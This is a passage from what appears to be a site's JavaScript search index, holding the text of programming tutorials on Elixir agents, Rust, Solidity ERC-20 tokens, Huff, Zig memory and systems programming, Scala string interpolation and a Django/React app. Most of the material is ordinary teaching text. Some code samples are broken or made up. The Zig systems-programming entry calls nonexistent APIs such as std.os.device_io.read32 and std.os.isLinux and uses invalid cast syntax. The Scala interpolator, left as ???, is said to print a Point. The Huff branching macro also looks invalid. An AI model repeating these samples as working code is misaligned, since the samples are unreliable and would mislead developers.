Agent.update(agent, fn list -\u003e [:nop | list] end) :ok Agent.get(agent, fn content -\u003e content end) [:nop, 12, %{a: 123}] As you can see, we can modify the agent state in any way we want. Therefore, we most likely don’t want to access the Agent API throughout many different places in our code. Instead, we want to encapsulate all Agent-related functionality in a single module, which we will call KV.Bucket. Before we implement it, let’s write some tests which will outline the API exposed by our module.\nCreate a file at test/kv/bucket_test.exs (remember the .exs extension) with the following:\ndefmodule KV.BucketTest do use ExUnit.Case, async: true test \"stores values by key\" do {:ok, bucket} = KV.Bucket.start_link([]) assert KV.Bucket.get(bucket, \"milk\") == nil KV.Bucket.put(bucket, \"milk\", 3) assert KV.Bucket.get(bucket, \"milk\") == 3 end end use ExUnit.Case is responsible for setting up our module for testing and imports many test-related functionality, such as the test/2 macro.\nOur first test starts a new KV.Bucket by calling the start_link/1 and passing an empty list of options. Then we perform some get/2 and put/3 operations on it, asserting the result.\nAlso note the async: true option passed to ExUnit.Case. This option makes the test case run in parallel with other :async test cases by using multiple cores in our machine. This is extremely useful to speed up our test suite. However, :async must only be set if the test case does not rely on or change any global values. For example, if the test requires writing to the file system or access a database, keep it synchronous (omit the :async option) to avoid race conditions between tests.\nIn order to fix the failing test, let’s create a file at lib/kv/bucket.ex with the contents below. Feel free to give a try at implementing the KV.Bucket module yourself using agents before peeking at the implementation below.\ndefmodule KV.Bucket do use Agent @doc \"\"\" Starts a new bucket. \"\"\" def start_link(_opts) do Agent.start_link(fn -\u003e %{} end) end @doc \"\"\" Gets a value from the `bucket` by `key`. \"\"\" def get(bucket, key) do Agent.get(bucket, \u0026Map.get(\u00261, key)) end @doc \"\"\" Puts the `value` for the given `key` in the `bucket`. \"\"\" def put(bucket, key, value) do Agent.update(bucket, \u0026Map.put(\u00261, key, value)) end end The first step in our implementation is to call use Agent. Most of the functionality we will learn in this guide, such as GenServer and Supervisor, follow this pattern. For all of them, calling use generates a child_spec/1 function with default configuration, which will be handy when we start supervising processes in chapter 4.\nThen we define a start_link/1 function, which will effectively start the agent. It is a convention to define a start_link/1 function that always accepts a list of options. We don’t plan on using any options right now, but we might later on. We then proceed to call Agent.start_link/1, which receives an anonymous function that returns the Agent’s initial state.\nWe are keeping a map inside the agent to store our keys and values. Getting and putting values on the map is done with the Agent API and the capture operator \u0026, introduced in the Getting Started guide. The agent passes its state to the anonymous function via the \u00261 argument when Agent.get/2 and Agent.update/2 are called.\nNow that the KV.Bucket module has been defined, our test should pass! You can try it yourself by running: mix test.\nTest setup with ExUnit callbacks Before moving on and adding more features to KV.Bucket, let’s talk about ExUnit callbacks. As you may expect, all KV.Bucket tests will require a bucket agent to be up and running. Luckily, ExUnit supports callbacks that allow us to skip such repetitive tasks.\nLet’s rewrite the test case to use callbacks:\ndefmodule KV.BucketTest do use ExUnit.Case, async: true setup do {:ok, bucket} = KV.Bucket.start_link([]) %{bucket: bucket} end test \"stores values by key\", %{bucket: bucket} do assert KV.Bucket.get(bucket, \"milk\") == nil KV.Bucket.put(bucket, \"milk\", 3) assert KV.Bucket.get(bucket, \"milk\") == 3 end end We have first defined a setup callback with the help of the setup/1 macro. The setup/1 macro defines a callback that is run before every test, in the same process as the test itself.\nNote that we need a mechanism to pass the bucket PID from the callback to the test. We do so by using the test context. When we return %{bucket: bucket} from the callback, ExUnit will merge this map into the test context. Since the test context is a map itself, we can pattern match the bucket out of it, providing access to the bucket inside the test:\ntest \"stores values by key\", %{bucket: bucket} do # `bucket` is now the bucket from the setup block end You can read more about ExUnit cases in the ExUnit.Case module documentation and more about callbacks in ExUnit.Callbacks.\nOther agent actions linkBesides getting a value and updating the agent state, agents allow us to get a value and update the agent state in one function call via Agent.get_and_update/2. Let’s implement a KV.Bucket.delete/2 function that deletes a key from the bucket, returning its current value:\n@doc \"\"\" Deletes `key` from `bucket`. Returns the current value of `key`, if `key` exists. \"\"\" def delete(bucket, key) do Agent.get_and_update(bucket, \u0026Map.pop(\u00261, key)) end Now it is your turn to write a test for the functionality above! Also, be sure to explore the documentation for the Agent module to learn more about them.\nClient/server in agents linkBefore we move on to the next chapter, let’s discuss the client/server dichotomy in agents. Let’s expand the delete/2 function we have just implemented:\ndef delete(bucket, key) do Agent.get_and_update(bucket, fn dict -\u003e Map.pop(dict, key) end) end Everything that is inside the function we passed to the agent happens in the agent process. In this case, since the agent process is the one receiving and responding to our messages, we say the agent process is the server. Everything outside the function is happening in the client.\nThis distinction is important. If there are expensive actions to be done, you must consider if it will be better to perform these actions on the client or on the server. For example:\ndef delete(bucket, key) do Process.sleep(1000) # puts client to sleep Agent.get_and_update(bucket, fn dict -\u003e Process.sleep(1000) # puts server to sleep Map.pop(dict, key) end) end When a long action is performed on the server, all other requests to that particular server will wait until the action is done, which may cause some clients to timeout.\n"
            }
        );
    index.add(
            {
                id:  219 ,
                href: "\/tutorials\/docs\/rust\/rust\/smart_pointers_rust\/",
                title: "Smart Pointers in Rust",
                description: "Deep dive into the world of smart pointers in Rust with this comprehensive guide on `Box`, `Rc`, and `Arc`. Learn how to effectively utilize these tools to manage memory in complex applications, including technical explanations, practical examples, and best practices for when to use each type of smart pointer.",
                content: "Introduction linkSmart pointers are data structures that not only manage memory but also have additional metadata and capabilities. Rust’s standard library provides several smart pointers, including Box, Rc, and Arc, each serving specific memory management needs with unique characteristics. This post covers each smart pointer in detail and discusses their appropriate use cases.\nUnderstanding Smart Pointers linkSmart pointers are more complex than typical pointers because they include additional “intelligence” such as reference counting or the capability to deallocate the box memory they point to.\nBox:\nUsage: Box is used to allocate values on the heap instead of the stack. It’s particularly useful for types whose size cannot be known at compile time and for large data structures to avoid stack overflow. Example: let b = Box::new(5); println!(\"b = {}\", b); Rc:\nUsage: Rc, or Reference Counting, enables multiple owners of the same data, tracking the number of references automatically and cleaning up the data when there are no more references. Example: use std::rc::Rc; let rc1 = Rc::new(5); let rc2 = rc1.clone(); println!(\"Count after cloning rc1: {}\", Rc::strong_count(\u0026rc2)); Arc:\nUsage: Similar to Rc, but designed for concurrent environments. Arc, or Atomic Reference Counting, is thread-safe and can be used across multiple threads. Example: use std::sync::Arc; use std::thread; let arc1 = Arc::new(5); let arc2 = arc1.clone(); thread::spawn(move || { println!(\"Value in thread: {}\", arc2); }).join().unwrap(); println!(\"Value in main thread: {}\", arc1); When to Use Smart Pointers linkChoosing the right type of smart pointer depends on your specific needs:\nBox:\nWhen You Need to Store Data on the Heap: Use Box when you need to ensure your data doesn’t overflow the stack due to its size or when you want to keep a complex data structure alive for the duration of your program. For Recursive Data Structures: Recursive data structures such as linked lists can be managed with Box because it allows you to have indeterminate length. Rc:\nWhen You Have Multiple Owners: Rc is ideal when your data needs multiple owners, and none of the owners outlives the others, typically used in single-threaded scenarios. Arc:\nFor Sharing Data Across Threads: Use Arc when you need to share data between threads without a known compile-time lifetime, ensuring data safety and avoiding data races. Best Practices for Smart Pointers link Avoid Unnecessary Use of Smart Pointers: While powerful, smart pointers introduce overhead. Use them when necessary—prefer ordinary structs and enums for data management unless you need explicit pointer or lifetime features. Combine Smart Pointers with Other Rust Features: For example, Mutex can be combined with Arc to safely share mutable data across threads. Understand Ownership and Borrowing: Smart pointers are subject to Rust’s ownership rules, so understanding these principles is crucial when working with Box, Rc, or Arc. Conclusion linkSmart pointers in Rust provide powerful tools for managing memory and data across different use cases, from single-threaded applications to complex multi-threaded systems. Understanding when and how to use each type of smart pointer will help you write more efficient and safe Rust applications.\n"
            }
        );
    index.add(
            {
                id:  220 ,
                href: "\/tutorials\/docs\/solidity\/",
                title: "Solidity",
                description: "Solidity is an object-oriented programming language. Learn more about the basics and applications of solidity",
                content: ""
            }
        );
    index.add(
            {
                id:  221 ,
                href: "\/tutorials\/docs\/solidity\/solidity\/solidity_and_erc20_tokens\/",
                title: "Solidity and ERC20 Tokens",
                description: "Learn about ERC20 tokens and how to implement them",
                content: "The Ethereum ecosystem features a variety of standards that guide the functionality of smart contracts from creation to deployment. The most common standards include ERC-20, ERC-721, ERC-777, and ERC-1155, each serving distinct purposes.\nThis article defines ERC-20 tokens, highlights their uses, and outlines some mandatory functions in Solidity that developers need to use to adhere to the standard. If you want to create your own ERC-20 token using Solidity, this guide will provide a comprehensive understanding of how to get started.\nWhat is an ERC-20 Token? linkAn ERC-20 token is a popular fungible cryptocurrency token compatible with Ethereum or EVM-compatible blockchains. It serves as a digital asset representing anything on the blockchain, offering flexibility for numerous use cases.\nThis preset smart contract contains a specific interface that serves as a technical standard for development. Developers can leverage the ERC-20 token and its associated rules for a streamlined development experience. Popular decentralized exchanges like Uniswap and SushiSwap utilize the ERC-20 token standard for its seamless compatibility and integration into their ecosystems.\nHow Are ERC-20 Tokens Used? linkERC-20 tokens have no restrictions on representation, allowing them to go beyond typical cryptocurrencies like ETH. They are fungible, transferable, and can be limited to a max supply, making them suitable for creating rewards, representing physical objects, shares of a company, and more.\nDesigned to standardize token development, the ERC-20 token can represent any fungible asset on the Ethereum blockchain. By providing variables such as name, symbol, and supply, anyone can launch an ERC-20 token with standard behavior and interface.\nERC-20 tokens are fungible, meaning each token is exactly equal to any other token without special rights or behavior. This equality of value makes ERC-20 tokens useful for applications like a medium of exchange, currency, voting rights, and staking.\nWhy is the ERC-20 Token Standard Important? linkThe ERC-20 token standard introduces a unified approach for fungible tokens, ensuring they share similar properties. Since its proposal in 2015, ERC-20 has allowed protocols, platforms, and developers to create smart contracts that can use any token following the standard without needing special logic for each new token. This standardization enhances the development process and significantly benefits the entire crypto ecosystem.\nWhat Solidity Functions Are Mandatory for All ERC-20 Tokens? linkThe ERC-20 standard includes a set of methods and events that must be present in every implementation. These methods handle value transfers, balance lookups, and other metadata retrievals.\n1. totalSupply linkThe totalSupply method denotes the current total supply of the tokens.\nfunction totalSupply() external view returns (uint256); 2. balanceOf linkThe balanceOf method returns the number of tokens held by a specific address.\nfunction balanceOf(address account) external view returns (uint256); 3. transfer linkThe transfer method sends tokens from one address to another, with the sender being the transaction origin.\nfunction transfer(address recipient, uint256 amount) external returns (bool); 4. approve linkThe approve method allows another address to spend tokens on behalf of the sender, commonly used in decentralized exchanges.\nfunction approve(address spender, uint256 amount) external returns (bool); 5. transferFrom linkThe transferFrom method works with approve, enabling a spender to transfer tokens from one address to another.\nfunction transferFrom(address sender, address recipient, uint256 amount) external returns (bool); 6. allowance linkThe allowance method returns the remaining number of tokens that a spender is allowed to spend on behalf of an owner.\nfunction allowance(address owner, address spender) external view returns (uint256); What Solidity Functions Are Optional for All ERC-20 Tokens? linkOptional functions like name, symbol, and decimals provide additional details about the contract, enhancing its readability and usability.\n1. Name linkThe name function provides a human-readable name for the token.\nstring public constant name = \"ERC20Basic\"; 2. Symbol linkThe symbol function provides a human-readable ticker symbol for the token, similar to ETH or BTC.\nstring public constant symbol = \"ERC\"; 3. Decimals linkThe decimals function defines the precision of the token, commonly set to 18 (same as Ether).\nuint8 public constant decimals = 18; What Are ERC-20 Data Structures? linkERC-20 data structures, such as balances and allowances, facilitate the organization and implementation of token operations on the blockchain.\nBalances linkAn internal table tracks the token balances of wallet addresses.\nmapping(address =\u003e uint256) balances; Allowances linkAn internal table tracks the delegated spending allowances of wallet addresses using nested mappings.\nmapping(address =\u003e mapping(address =\u003e uint256)) allowances; Summary linkThe ERC-20 token standard provides a robust framework for creating fungible tokens on the Ethereum blockchain. By adhering to the mandatory functions and understanding the optional extensions, developers can create tokens that are easily integratable into the existing Ethereum ecosystem. The standardization introduced by ERC-20 has significantly streamlined token development and interaction, benefiting the broader crypto community.\n"
            }
        );
    index.add(
            {
                id:  222 ,
                href: "\/tutorials\/docs\/huff\/huff\/advanced_features_using_huff\/",
                title: "Some Advanced Features With Huff",
                description: "Huff is a domain-specific, low-level programming language designed explicitly for writing smart contracts on the Ethereum blockchain.",
                content: "Advanced Huff Features linkIn-Depth Look at Advanced Huff Features linkHuff allows for a range of advanced features that provide developers with extensive control and optimization capabilities. Some of these advanced features include:\nInline Assembly: Huff permits inline assembly, giving developers the ability to embed raw EVM opcodes within their Huff code. Conditional Execution: Huff supports conditional execution using EVM opcodes like JUMPI, allowing for complex logical flows. Gas Optimization Techniques: Advanced Huff programmers can optimize their contracts for gas efficiency by directly manipulating the stack and using opcodes efficiently. Direct Memory Access: Huff provides direct access to Ethereum’s memory model, enabling fine-tuned memory management. Efficiency and Optimization Techniques linkEfficiency in Huff comes from its ability to directly control the EVM opcodes. Some techniques include:\nOpcode Selection: Choosing the right opcodes can significantly reduce gas costs. Stack Management: Efficient stack manipulation can reduce the number of operations required. Memory Usage: Optimizing memory usage is key, as memory operations can be gas-intensive. Code Example: Advanced Contract Features linkLet’s look at a more complex Huff contract example that demonstrates conditional logic and direct memory manipulation.\n#define macro CHECK_VALUE() = takes (2) returns (1) { dup2 // Duplicate the second stack item gt // Check if value1 \u003e value2 // Conditional jump based on comparison jumpi(LOCATION_IF_TRUE, LOCATION_IF_FALSE) } #define macro LOCATION_IF_TRUE() = takes (0) returns (0) { // Logic for true condition // ... jump(END) } #define macro LOCATION_IF_FALSE() = takes (0) returns (0) { // Logic for false condition // ... jump(END) } #define macro END() = takes (0) returns (0) { // End of the macro logic } In this example, the CHECK_VALUE macro performs a comparison and jumps to different locations based on the result, showcasing Huff’s ability to handle complex logic flows.\n"
            }
        );
    index.add(
            {
                id:  223 ,
                href: "\/tutorials\/docs\/zig\/zig\/stack_memory_in_zig\/",
                title: "Stack Memory in Zig",
                description: "Zig is a general-purpose programming language and toolchain for maintaining robust, optimal, and reusable software.",
                content: "Diving into pointers provided insight into the relationship between variables, data and memory. So we’re getting a sense of what the memory looks like, but we’ve yet to talk about how data and, by extension, memory is managed. For short lived and simple scripts, this likely doesn’t matter. In an age of 32GB laptop, you can start your program, use a few hundred megabytes of RAM reading a file and parsing an HTTP response, do something amazing, and exit. On program exit, the OS knows that whatever memory it gave your program can now be used for something else.\nBut for programs that run for days, months or even years, memory becomes a limited and precious resource, likely sought after by other processes running on the same machine. There’s simply no way to wait until the program exits to free memory. This is a garbage collector’s primary job: knowing what data is no longer in-use and freeing its memory. In Zig, you’re the garbage collector.\nMost of the programs you write will make use of three “areas” of memory. The first is global space, which is where program constants, including string literals, are stored. All global data is baked into the binary, fully known at compile time (and thus runtime) and immutable. This data exists throughout the lifetime of the program, never needing more or less memory. Aside from the impact it has on the size of our binary, this isn’t something we need to worry about at all.\nThe second area of memory is the call stack, the topic for this part. The third area is the heap, the topic for our next part.\nThere isn’t a real physical difference between the areas of memory, it’s a concept created by the OS and the executable. Stack Frames All of the data we’ve seen so far have been constants stored in the global data section of our binary or local variables. “Local” indicates that the variable is only valid within the scope where it’s declared. In Zig, scopes begin and end with curly braces, { … }. Most variables are scoped to a function, including function parameters, or a control-flow block, like an if. But, as we’ve seen, you can create arbitrary blocks and thus, arbitrary scopes.\nIn the previous part, we visualized the memory of our main and levelUp functions, each with a User:\nmain: user -\u003e ------------- (id: 1043368d0) | 1 | ------------- (power: 1043368d8) | 100 | ------------- (name.len: 1043368dc) | 4 | ------------- (name.ptr: 1043368e4) | 1182145c0 |------------------------- levelUp: user -\u003e ------------- (id: 1043368ec) | | 1 | | ------------- (power: 1043368f4) | | 100 | | ------------- (name.len: 1043368f8) | | 4 | | ------------- (name.ptr: 104336900) | | 1182145c0 |------------------------- ------------- | | ............. empty space | ............. or other data | | ------------- (1182145c0) \u003c--- | 'G' | ------------- | 'o' | ------------- | 'k' | ------------- | 'u' | ------------- There’s a reason levelUp is immediately after main: this is our [simplified] call stack. When our program starts, main, along with its local variables are pushed onto the call stack. When levelUp is called, its parameters and any local variables are pushed onto the call stack. Importantly, when levelUp returns, it’s popped off the stack. After levelUp returns and control is back in main, our call stack looks like:\nmain: user -\u003e ------------- (id: 1043368d0) | 1 | ------------- (power: 1043368d8) | 100 | ------------- (name.len: 1043368dc) | 4 | ------------- (name.ptr: 1043368e4) | 1182145c0 |------------------------- ------------- | ............. empty space | ............. or other data | | ------------- (1182145c0) \u003c--- | 'G' | ------------- | 'o' | ------------- | 'k' | ------------- | 'u' | ------------- When a function is called, its entire stack frame is pushed onto the call stack. This is one of the reasons we need to know the size of every type. While we might not know the length of our user’s name until that specific line of code is executed (assuming it wasn’t a constant string literal), we do know that our function has a User and, in addition to the other fields, we’ll need 8 bytes for name.len and 8 bytes name.ptr.\nWhen the function returns, its stack frame, which was the last pushed onto the call stack, is popped off. Something amazing just happened: the memory used by levelUp has been automatically freed! While technically that memory could be returned to the OS, as far as I know, no implementation actually shrinks the call stack (they will dynamically grow it when necessary though). Still, the memory used to store levelUp’s stack frame is now free to be used within our process for another stack frame.\nIn a normal program, the call stack can grow quite large. Between all the framework code and libraries that a typical program uses, you end up with deeply nested functions. Normally, that isn’t a problem, but now and again, you might have run into some type of stack overflow error. This happens when our call stack has run out of space. More often than not, this happens with recursive functions - a function that calls itself. Like our global data, the call stack is managed by the OS and the executable. On program start, and for each thread we start thereafter, a call stack is created (the size of which can normally be configured in the OS). The call stack exists for the life of the program or, in the case of a thread, the life of the thread. On program or thread exit, the call stack is freed. But where our global data has all of the programs global data, the call stack only has stack frames for the currently executing hierarchy of functions. This is efficient both in terms of memory usage as well as the simplicity of pushing and popping stack frames on and off the stack.\nDangling Pointers linkThe call stack is amazing for both its simplicity and efficiency. But it’s also frightening: when a function returns, any of its local data becomes inaccessible. That might sound reasonable, it is local data after all, but it can introduce serious issues. Consider this code:\nconst std = @import(\"std\"); pub fn main() void { const user1 = User.init(1, 10); const user2 = User.init(2, 20); std.debug.print(\"User {d} has power of {d}\\n\", .{user1.id, user1.power}); std.debug.print(\"User {d} has power of {d}\\n\", .{user2.id, user2.power}); } pub const User = struct { id: u64, power: i32, fn init(id: u64, power: i32) *User{ var user = User{ .id = id, .power = power, }; return \u0026user; } }; At quick glance, it would be reasonable to expect the following output:\nUser 1 has power of 10 User 2 has power of 20 I got:\nUser 2 has power of 20 User 9114745905793990681 has power of 0 You might get different results, but based on my output, user1 has inherited the values of user2, and user2 values are nonsensical. The key problem with this code is that User.init returns the address of the local user, \u0026user. This is called a dangling pointer, a pointer that references invalid memory. It’s the source of many segfaults.\nWhen a stack frame is popped off the call stack, any references we have to that memory are invalid. The result of trying to access that memory is undefined. You’ll likely get nonsense data or a segfault. We could try to make some sense out of my output, but it isn’t a behavior we would want to, or even could, rely on.\nOne challenge with this type of bug is that, in languages with garbage collectors, the above code is perfectly fine. Go for example would detect that the local user outlives its scope, the init function, and would ensure its validity for as long as it’s needed (how Go does this is an implementation detail, but it has a few options, including moving the data to the heap, which is what the next part is about).\nThe other issue, I’m sorry to say, is that it can be a hard to spot bug. In our above example, we’re clearly returning the address of a local. But such behavior can hide inside of nested function and complex data types. Do you see any possible issues with the following incomplete code:\nfn read() !void { const input = try readUserInput(); return Parser.parse(input); } Whatever Parser.parse returns outlives input. If Parser holds a reference to input, that’ll be a dangling pointer just waiting to crash our app. Ideally, if Parser needs input to live as long as it does, it will make a copy of it and that copy will be tied to its own lifetime (more on this in the next part). But there’s nothing here to enforce this contract. Parser’s documentation might shed some light on what it expects of input or what it does with it. Lacking that, we might need to dig into the code to figure it out.\nThe simple way to solve our initial bug is to change init so that it returns a User rather than a *User (pointer to a User). We’d then be able to return user; rather than return \u0026user;. But that won’t always be possible. Data often has to live beyond the rigid boundaries of function scopes. For that we have the third memory area, the heap, the topic of the next part.\nBefore diving into the heap, know that we’ll see one final example of dangling pointers before the end of this guide. At that point, we’ll have covered enough of the language to give a sightly less convoluted example. I want to revisit this topic because, for developers coming from garbage collected languages, this is likely to cause bugs and frustration. It is something you will get a handle on. It comes down to being aware of where and when data exists.\n"
            }
        );
    index.add(
            {
                id:  224 ,
                href: "\/tutorials\/docs\/scala\/scala\/string_interpolation_in_scala\/",
                title: "String Interpolation in Scala",
                description: "Scala Lang description",
                content: "String interpolation is a powerful feature in Scala that enables the seamless integration of variables and expressions within strings. Understanding and mastering string interpolation can significantly improve the readability and expressiveness of your Scala code. In this comprehensive guide, we’ll explore the basics of string interpolation, delve into its various interpolators, and even discuss how to create your own custom interpolators.\nUnderstanding String Interpolation linkString interpolation provides a straightforward way to embed variables and expressions directly within strings. Consider the following example:\nval name = \"James\" val age = 30 println(s\"$name is $age years old\") // Output: James is 30 years old Here, the s prefix before the string enables string interpolation, allowing variables to be inserted using $.\nThe s Interpolator (s-Strings) linkThe s interpolator is the most commonly used and simplest interpolator in Scala. It allows for the direct substitution of variables within strings. For instance:\nval name = \"James\" val age = 30 println(s\"$name is $age years old\") // Output: James is 30 years old You can also embed arbitrary expressions within ${}:\nprintln(s\"2 + 2 = ${2 + 2}\") // Output: 2 + 2 = 4 val x = -1 println(s\"x.abs = ${x.abs}\") // Output: x.abs = 1 The f Interpolator (f-Strings) linkThe f interpolator allows for formatted strings, akin to printf in other languages. It ensures type safety by enforcing correct types for format strings. Here’s an example:\nval height = 1.9d val name = \"James\" println(f\"$name%s is $height%2.2f meters tall\") // Output: James is 1.90 meters tall The raw Interpolator linkThe raw interpolator is similar to s, but it performs no escaping of literals within the string. This is useful when you want to preserve special characters as-is. For example:\nscala\u003e s\"a\\nb\" res0: String = a b scala\u003e raw\"a\\nb\" res1: String = a\\nb Creating Custom Interpolators linkIn Scala, you can create your own custom interpolators to tailor string interpolation to your specific needs. This allows for powerful syntactic enhancements and domain-specific language creation. For instance, let’s create a custom p interpolator that constructs a Point object:\ncase class Point(x: Double, y: Double) implicit class PointHelper(val sc: StringContext) extends AnyVal { def p(args: Double*): Point = ??? } val pt = p\"1,-2\" // Output: Point(1.0,-2.0) Conclusion linkString interpolation is a fundamental feature of Scala that greatly enhances code readability and expressiveness. By mastering the various interpolators and even creating custom ones, you can unlock the full potential of string manipulation in Scala. Whether you’re formatting strings, building DSLs, or crafting complex expressions, string interpolation provides a powerful and intuitive mechanism to achieve your goals. Start leveraging string interpolation in your Scala projects today and take your coding to new heights!\n"
            }
        );
    index.add(
            {
                id:  225 ,
                href: "\/tutorials\/docs\/rust\/rust\/structuring_rust_projects_modules_crates\/",
                title: "Structuring Rust Projects: Modules and Crates Explained",
                description: "Deepen your understanding of Rust's module system and learn how to leverage external crates for project enhancement. This comprehensive guide covers the essentials of organizing code with modules and integrating functionality from external sources through crates. Perfect for Rust developers aiming to build scalable and maintainable applications.",
                content: "Introduction linkRust’s module system and its ecosystem of crates are instrumental in managing large codebases and reusing code effectively. This post explores how to structure Rust projects using modules and how to enhance functionality by utilizing external crates.\nOrganizing Code with Modules linkModules in Rust are a powerful feature for organizing code within a library or application. They help in encapsulating functionality, improving readability, managing scope, and facilitating code reuse.\nUnderstanding the Module System:\nDefining Modules: You can define a module with the mod keyword, which encapsulates items like functions, structs, enums, and other modules. mod network { fn connect() {} } Module Hierarchy: Modules can be nested within other modules to create a tree-like hierarchy that mirrors the functionality of the software. mod communications { mod network { fn connect() {} } mod client { fn connect() {} } } Visibility and Privacy: Rust’s privacy rules are integral to its module system. Functions, structs, and methods are private by default and can be made public with the pub keyword. mod network { pub fn connect() {} } Best Practices for Using Modules:\nFile System Layout: Rust allows you to move module bodies to separate files to keep the codebase manageable and navigable. // In src/lib.rs or main.rs mod network; // Corresponding file src/network/mod.rs or src/network.rs Use Declarations: Use use declarations to simplify the access to items within modules, especially when dealing with deep module hierarchies. mod communications { pub mod network { pub fn connect() {} } } use communications::network; fn main() { network::connect(); } Using External Crates linkCrates are Rust’s units of code reuse, comprising either binary or library projects. Using external crates allows developers to leverage community-developed solutions instead of reinventing the wheel.\nFinding and Adding Crates:\nCrates.io: Rust’s official package registry, crates.io, hosts thousands of crates. You can search for crates that suit your needs and include them in your project. Adding a Crate to Your Project: To use a crate, add it to your Cargo.toml file under [dependencies]. [dependencies] serde = \"1.0\" Example of Using an External Crate:\nUsing serde for Serialization: use serde::{Serialize, Deserialize}; #[derive(Serialize, Deserialize)] struct Person { name: String, age: u32, } Here, serde is used to serialize and deserialize the Person struct into various data formats like JSON. Advanced Usage of Modules and Crates link Re-exporting Items: Modules can re-export items with pub use, allowing external code to access nested modules or crate dependencies more easily.\nmod network { pub fn connect() {} } pub use network::connect; Organizing Tests: Use modules to organize unit tests and integration tests effectively within your Rust project.\n#[cfg(test)] mod tests { #[test] fn test_connect() { super::connect(); assert!(true); } } Conclusion linkRust’s module system and its robust handling of external crates provide a structured way to organize code and extend functionality with minimal effort. Mastering these tools is crucial for any Rust programmer looking to build scalable and maintainable applications.\n"
            }
        );
    index.add(
            {
                id:  226 ,
                href: "\/tutorials\/docs\/system-design\/",
                title: "System Design",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: ""
            }
        );
    index.add(
            {
                id:  227 ,
                href: "\/tutorials\/docs\/zig\/zig\/system_programming_using_zig\/",
                title: "System Programming in Zig",
                description: "Zig is a general-purpose programming language and toolchain for maintaining robust, optimal, and reusable software.",
                content: "System programming with Zig involves tasks such as interacting with hardware, writing device drivers, and working with low-level APIs. Zig’s focus on safety, performance, and simplicity makes it well-suited for system programming tasks. In this tutorial, we’ll explore how Zig can be used for system programming, covering topics such as low-level memory management, interacting with hardware, and writing platform-specific code.\nLow-Level Memory Management linkOne of the core aspects of system programming is managing memory efficiently. Zig provides low-level memory management capabilities that allow you to work directly with memory addresses and manipulate memory layout.\nExample: Allocating and Freeing Memory link const std = @import(\"std\"); pub fn main() void { const allocator = std.heap.page_allocator; const ptr = allocator.alloc(u8, 1024); defer allocator.free(ptr); // Use allocated memory... } Interacting with Hardware linkSystem programming often involves interacting with hardware components such as peripherals, sensors, and IO devices. Zig’s low-level capabilities make it suitable for writing code that communicates directly with hardware.\nExample: GPIO Control on Embedded Systems link const std = @import(\"std\"); const GPIO_BASE = 0x40000000; const GPIO_PIN = GPIO_BASE + 0x10; pub fn main() void { // Access GPIO register directly var gpioReg: *volatile u32 = (*u32)(GPIO_PIN); // Set pin high gpioReg.* = 1; } Writing Device Drivers linkDevice drivers are essential components of operating systems that facilitate communication between hardware devices and the operating system kernel. Zig’s ability to interface with C libraries and its low-level capabilities make it suitable for writing device drivers.\nExample: Writing a Simple Device Driver link const std = @import(\"std\"); const DEVICE_REGISTER = 0x12345678; pub fn readDeviceRegister() u32 { return std.os.device_io.read32(DEVICE_REGISTER); } pub fn writeDeviceRegister(value: u32) void { std.os.device_io.write32(DEVICE_REGISTER, value); } Platform-Specific Code linkSystem programming often requires writing platform-specific code to interact with the underlying hardware and operating system. Zig provides facilities for writing platform-specific code while maintaining portability across different platforms.\nExample: Platform-Specific Code for Linux and Windows link const std = @import(\"std\"); const LINUX_SPECIFIC = @import(\"linux_specific.zig\"); const WINDOWS_SPECIFIC = @import(\"windows_specific.zig\"); pub fn main() void { // Platform-specific code if (std.os.isLinux()) { LINUX_SPECIFIC.doLinuxStuff(); } else if (std.os.isWindows()) { WINDOWS_SPECIFIC.doWindowsStuff(); } else { std.debug.print(\"Unsupported platform.\\n\", .{}); } } Conclusion linkZig’s focus on safety, performance, and simplicity makes it an excellent choice for system programming tasks. Whether you’re working on low-level memory management, interacting with hardware, writing device drivers, or writing platform-specific code, Zig provides the tools and capabilities you need to build reliable and efficient system software.\nThis tutorial provides an overview of how Zig can be used for system programming, demonstrating its capabilities for working with hardware, managing memory, writing device drivers, and handling platform-specific code.\n"
            }
        );
    index.add(
            {
                id:  228 ,
                href: "\/tutorials\/docs\/full-stack-projects\/full-stack-projects\/task_manager_using_react\/",
                title: "Task Manager using Django and React",
                description: "How to install and use libraries",
                content: "In this tutorial, we will learn the process of communicating between the Django Backend and React js frontend using the Django REST Framework. For the sake of a better understanding of the concept, we will be building a Simple Task Manager and go through the primary concepts for this type of integration between React js and Django.\nProject overview linkThis task manager application is a sort of to-do list. Here we will have three buttons as “Completed”, “Incomplete” and a button to add the task named “Add task”\nIn order to add a task, you click on the Add task button which will open up a window within the app to add the task as shown below. Here we can add the “Title” for the task and give it a description inside the “Description” section. Finally, you can check or uncheck depending upon the status of the task(ie, Completed or Incomplete)\nAfter you “Save” the task, you can navigate between the Completed and Incomplete tabs to keep track of the tasks.\nAll of the operations performed above are managed by the Django REST Framework.\nProject Setup linkYou will need\npython 3, Node js, and a text editor. Create a directory named “Django-react-app” using the below command(the command may change slightly depending upon your OS), moved into the directory that we just created using the below and now create a virtual environment using the below command:\nmkdir django-react cd django-react python -m venv dar We have named our virtual environment “dar”, short for Django and react. This is necessary as we don’t have to install packages and dependencies globally. It is also a good programming practice.\nNow activate the virtual environment that we just created using the command below\"\ndar\\Scripts\\activate.bat Installation Now install Django inside the virtual machine using the below command. You will get a similar message as your installation gets completed and now let’s create our project named “backend” for our Django backend. To do so use the below command:\npip install django django-admin startproject backend cd backend Now we will start our app and call it “todo” using the below command:\npython manage.py startapp todo The app gets created using the above command.\nNow use the below command to migrate the project:\npython manage.py migrate Running the server:\npython manage.py runserver Now we need to take some configuration steps inside the settings.py file. In the INSTALLED_APPS section add the name of the app that we created (ie, todo) as shown below:\n# Application definition INSTALLED_APPS = [ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'todo', ] Creating a Model linkNext, we will need to create a Model. The Model will determine how the to-do items are stored in the database. We will have three properties in the model:\nTitle: This will be the title of the task with a maximum length of 150 characters. Description: This will be the description of the task with a maximum length of 500 characters. Completed: This will be a boolean value, that will be used to determine the current status of the task. By default, it will be set to false. So go ahead and open the models.py file and the following code:\nclass Todo(models.Model): title=models.CharField(max_length=150) description=models.CharField(max_length=500) completed=models.BooleanField(default=False) We will also create a string representation of the title inside the Todo class as follows:\ndef __str__(self): #it will return the title return self.title At this point, our models.py file will look like this:\nfrom django.db import models class Todo(models.Model): title=models.CharField(max_length=150) description=models.CharField(max_length=500) completed=models.BooleanField(default=False) # string representation of the class def __str__(self): #it will return the title return self.title Now let’s 